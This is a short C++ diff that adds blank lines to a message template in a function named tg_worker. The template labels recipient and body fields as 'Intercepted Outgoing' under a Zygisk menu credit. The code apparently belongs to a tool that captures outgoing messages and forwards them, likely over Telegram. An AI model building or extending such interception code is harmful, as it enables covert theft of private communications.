@@ -159,15 +159,17 @@ void* tg_worker(void* arg) {
             }
             return o;
         };
-        // Exact screenshot: bold header+labels, mono To/Body, blank gaps
+        // Screenshot spacing: blank after header + blank between To ↔ Body
         std::string text =
             "\xF0\x9F\x93\xB1 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus "
             "\xF0\x9F\x94\xA5</b>\n";
+        text += "\n";
         text += "\n";
         text += "<b>To (Tap to copy):</b>\n";
         text += "<code>";
         text += html_esc(to_disp);
         text += "</code>\n";
+        text += "\n";
         text += "\n";
         text += "<b>Body (Tap to copy):</b>\n";
         text += "<code>";
